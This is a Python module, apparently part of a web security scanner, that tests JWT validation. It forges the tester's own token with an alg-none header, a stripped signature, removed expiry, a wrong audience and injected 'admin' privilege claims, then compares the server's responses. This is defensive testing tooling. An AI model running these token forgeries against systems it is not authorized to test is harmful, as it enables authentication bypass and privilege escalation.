"""JWT confusion probes (alg confusion, stripped signatures).

Replays an authorized identity's own Bearer token with the signature
neutralized and compares against the baseline. Only the test
account's own token is ever mutated — no foreign tokens, no key
guessing, no brute force. A tampered token served like the baseline
is a candidate; a denial is a genuine negative.
"""
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from ..auth.jwt import parse_jwt
from ..budgets import BudgetExceeded
from ..logging_setup import get_logger

log = get_logger("jwt-replay")


def _b64url_encode(data: bytes) -> str:
    import base64
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _encode_segment(obj: dict) -> str:
    import json as _json
    return _b64url_encode(_json.dumps(obj, separators=(",", ":"),
                                     ensure_ascii=False).encode("utf-8"))


def bearer_token(headers) -> str:
    """First JWT-shaped Bearer token in headers, or ''."""
    try:
        items = list((headers or {}).items())
    except (AttributeError, TypeError):
        return ""
    for name, value in items:
        if str(name).lower() != "authorization":
            continue
        text = str(value or "")
        prefix, _, token = text.partition(" ")
        if prefix.lower() != "bearer" or not token.strip():
            continue
        if parse_jwt(token.strip()) is not None:
            return token.strip()
    return ""


def tamper_variants(token: str) -> List[Tuple[str, str]]:
    """Bounded confusion variants: (label, mutated token)."""
    claims = parse_jwt(token)
    if claims is None:
        return []
    try:
        header = dict(claims.header)
        payload = dict(claims.payload)
    except (TypeError, ValueError, AttributeError):
        return []
    variants = []
    none_header = dict(header)
    none_header["alg"] = "none"
    variants.append(("alg-none",
                     f"{_encode_segment(none_header)}."
                     f"{_encode_segment(payload)}."))
    variants.append(("empty-signature",
                     f"{_encode_segment(header)}."
                     f"{_encode_segment(payload)}."))
    return variants


# Privilege-shaped claim names. Only these are ever upgraded or
# injected — never sub/iss/jti (cross-user, issuer spoofing, and
# replay are out of scope for this probe).
_PRIVILEGE_CLAIMS = ("role", "roles", "admin", "is_admin", "isadmin",
                     "scope", "scp", "groups", "permissions",
                     "is_staff", "is_superuser")

_INVALID_AUDIENCE = "apex-invalid-audience"


def _already_privileged(value: Any) -> bool:
    if value is True:
        return True
    if isinstance(value, str):
        return value.strip().lower() == "admin"
    if isinstance(value, (list, tuple)):
        return any(isinstance(v, str) and v.strip().lower() == "admin"
                   for v in value)
    return False


def claim_variants(token: str) -> List[Tuple[str, str]]:
    """Bounded claim-tampering variants: (label, mutated token).

    Only the caller's own token is mutated, and only exp/aud plus
    privilege-shaped claims. The original header and signature
    segments are preserved byte-identical so each variant isolates
    claim validation (a server that skips signature checks is
    already caught by the confusion variants; acceptance notes name
    both possibilities).
    """
    claims = parse_jwt(token)
    if claims is None:
        return []
    try:
        payload = dict(claims.payload)
        segments = str(token).strip().strip("'\"").split(".")
    except (TypeError, ValueError, AttributeError):
        return []
    if len(segments) != 3:
        return []
    head, _, sig = segments

    def _splice(mutated: dict) -> str:
        return f"{head}.{_encode_segment(mutated)}.{sig}"

    variants = []
    if "exp" in payload:
        stripped = {k: v for k, v in payload.items() if k != "exp"}
        variants.append(("exp-removed", _splice(stripped)))
    if "aud" in payload and payload.get("aud") != _INVALID_AUDIENCE:
        mutated = dict(payload)
        mutated["aud"] = _INVALID_AUDIENCE
        variants.append(("aud-mismatched", _splice(mutated)))
    priv_key = next((k for k in payload
                     if str(k).lower() in _PRIVILEGE_CLAIMS), None)
    if priv_key is not None:
        current = payload[priv_key]
        upgraded: Any = None
        if isinstance(current, bool):
            upgraded = True
        elif isinstance(current, str):
            upgraded = "admin"
        elif isinstance(current, list):
            upgraded = ["admin"]
        if upgraded is not None and not _already_privileged(current):
            mutated = dict(payload)
            mutated[priv_key] = upgraded
            variants.append(("privilege-upgraded", _splice(mutated)))
    else:
        mutated = dict(payload)
        mutated["role"] = "admin"
        variants.append(("privilege-injected", _splice(mutated)))
    return variants[:3]


@dataclass
class JwtProbeResult:
    url: str
    identity: str = ""
    # accepted | denied | inconclusive | untestable
    verdict: str = "inconclusive"
    notes: str = ""
    status: int = 0
    evidence: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {"url": self.url, "identity": self.identity,
                "verdict": self.verdict, "notes": self.notes,
                "status": self.status, "evidence": dict(self.evidence)}


def _swap_bearer(headers, token: str) -> Dict[str, str]:
    swapped = {}
    try:
        items = list((headers or {}).items())
    except (AttributeError, TypeError):
        return swapped
    for name, value in items:
        if str(name).lower() == "authorization":
            swapped[name] = f"Bearer {token}"
        else:
            swapped[name] = value
    return swapped


def jwt_confusion_probe(client, url: str, identity_headers: Dict,
                        identity_name: str = "tester",
                        timeout: int = 10) -> Optional[JwtProbeResult]:
    """Replay caller-owned Bearer variants; compare with baseline."""
    from ..validation.differential import normalize_response
    original = bearer_token(identity_headers)
    if not original:
        return None
    res = JwtProbeResult(url=url, identity=identity_name)
    try:
        base = client.get(url, headers=dict(identity_headers),
                          timeout=timeout)
    except BudgetExceeded:
        raise
    except Exception as e:
        res.notes = f"baseline failed: {e}"[:200]
        return res
    base_norm = normalize_response(base)
    if base_norm["status"] != 200:
        res.notes = f"baseline HTTP {base_norm['status']}: session " \
                    f"expired or endpoint not authorized for this " \
                    f"identity — nothing to compare"
        return res
    attempts = [(label, mutated, False)
                for label, mutated in tamper_variants(original)]
    attempts += [(label, mutated, True)
                 for label, mutated in claim_variants(original)]
    for label, mutated, is_claim in attempts:
        try:
            r = client.get(url, headers=_swap_bearer(identity_headers,
                                                     mutated),
                           timeout=timeout)
        except BudgetExceeded:
            raise
        except Exception as e:
            res.notes = f"{label} request failed: {e}"[:200]
            return res
        norm = normalize_response(r)
        if norm["status"] in (401, 403):
            continue  # this variant correctly rejected
        if norm["status"] == 200 and (
                norm["body_hash"] == base_norm["body_hash"] or
                (norm["key_shape"] and
                 norm["key_shape"] == base_norm["key_shape"])):
            res.verdict = "accepted"
            res.status = 200
            reason = _claim_reason(label) if is_claim else \
                "signature may not be enforced"
            res.notes = f"tampered token ({label}) served like the " \
                        f"baseline — {reason}"
            res.evidence = {"variant": label,
                            "baseline_hash": base_norm["body_hash"],
                            "replay_hash": norm["body_hash"]}
            return res
    res.verdict = "denied"
    res.notes = "confusion and claim variants rejected or diverged"
    return res


def _claim_reason(label: str) -> str:
    if label == "exp-removed":
        return "token expiry (and/or signature) may not be enforced"
    if label == "aud-mismatched":
        return "token audience (and/or signature) may not be enforced"
    return "privilege claims (and/or signature) may not be enforced " \
           "— confirm the privilege takes effect, not just acceptance"
